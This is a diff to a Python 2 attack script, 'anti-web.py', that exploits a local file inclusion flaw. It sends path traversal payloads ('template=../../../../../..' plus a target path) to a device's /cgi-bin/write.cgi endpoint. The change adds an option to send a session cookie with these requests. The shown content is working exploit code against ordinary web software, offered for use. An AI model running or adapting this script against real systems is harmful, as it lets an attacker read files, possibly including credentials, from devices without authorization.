@@ -30,14 +30,17 @@ parser = argparse.ArgumentParser(prog='anti-web.py',
 								version="1")
 
 parser.add_argument('--host', 	dest="HOST", 	help='host',required=True)
-parser.add_argument('--port', 	dest="PORT", 	help='set port (default = 80)',  default="80", required=False)
-parser.add_argument('--file', 	dest="LFI", 	help='Test LFI',  default=0, required=False)
+parser.add_argument('--port', 	dest="PORT", 	help='Set port (default = 80)', default="80", required=False)
+parser.add_argument('--file', 	dest="LFI", 	help='Test LFI',  	default=0, 	required=False)
+parser.add_argument('-ck', 		dest="COOKIE",	help='Set Cookie',  default=0, 	required=False)
+
 
 args 	= parser.parse_args()
 
 HST   	= args.HOST
 PRT 	= args.PORT
 xFILE 	= args.LFI
+cookie 	= 	args.COOKIE
 
 class Colors:
     BLUE 		= '\033[94m'
@@ -68,7 +71,7 @@ xFiles = [
 
 host  	=  "http://"+HST+":"+PRT+"/cgi-bin/write.cgi"
 
-def makeReq(filePost, hst,prt):
+def makeReq(filePost, hst,prt,xCookie):
 	headers = {}
 	lenLFI 	= int(len(filePost))
 	ContLen = str(37+lenLFI)
@@ -82,6 +85,9 @@ def makeReq(filePost, hst,prt):
 	headers["Connection"] 		= "close"
 	headers["Content-Type"] 	= "application/x-www-form-urlencoded"
 
+	if cookie:
+		headers["Cookie"]			= "ID="+xCookie
+
 	return headers
 
 
@@ -91,7 +97,7 @@ def checkLFI(pathLFI):
 		#headers = {}
 		thePostX = "page=/&template=../../../../../.."+str(pathLFI)
 
-		hdrX = makeReq(thePostX,HST,PRT)
+		hdrX = makeReq(thePostX,HST,PRT,cookie)
 		try:
 			rX = requests.post(host, data=thePostX,headers=hdrX,timeout=10.000)
 		except Exception,e:
